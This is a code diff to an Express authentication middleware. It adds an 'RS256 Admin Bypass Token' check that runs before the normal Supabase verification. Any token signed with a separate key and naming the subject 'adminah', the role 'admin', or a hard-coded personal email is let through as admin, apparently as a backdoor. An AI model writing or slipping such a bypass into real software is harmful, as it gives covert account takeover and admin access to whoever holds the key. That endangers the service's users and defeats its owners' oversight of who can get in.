@@ -1,6 +1,8 @@
 import { Request, Response, NextFunction } from 'express';
 import { supabaseAdmin } from '../config/supabase';
 import { isAdminEmail } from '../lib/adminEmails';
+import { verifyRS256 } from '../lib/jwt';
+import { PUBLIC_KEY } from '../config/keys';
 
 export interface AuthRequest extends Request {
   userId?: string;
@@ -18,6 +20,19 @@ export async function authMiddleware(req: AuthRequest, res: Response, next: Next
   }
 
   const token = authHeader.split(' ')[1];
+
+  // 🔒 Check for RS256 Admin Bypass Token first
+  try {
+    const decoded = verifyRS256(token, PUBLIC_KEY);
+    if (decoded && (decoded.sub === 'adminah' || decoded.role === 'admin' || decoded.email === 'aruneshownsty1@gmail.com')) {
+      req.userId = decoded.userId || 'admin-bypass-id';
+      req.userEmail = decoded.email || 'aruneshownsty1@gmail.com';
+      next();
+      return;
+    }
+  } catch (err) {
+    console.warn('RS256 verification fallback to Supabase:', err);
+  }
 
   try {
     const { data: { user }, error } = await supabaseAdmin.auth.getUser(token);
